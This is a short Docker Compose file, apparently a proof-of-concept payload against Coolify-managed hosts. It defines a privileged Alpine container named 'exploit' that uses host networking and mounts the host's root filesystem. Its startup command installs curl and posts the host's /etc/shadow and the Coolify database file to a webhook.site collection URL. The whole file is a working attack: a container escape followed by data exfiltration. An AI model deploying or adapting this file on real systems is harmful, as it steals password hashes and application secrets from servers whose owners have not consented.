version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    container_name: exploit
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl
        cat /host-root/etc/shadow | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=shadow_exfil
        cat /host-root/data/coolify/coolify.db | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=db_exfil
        sleep 3600
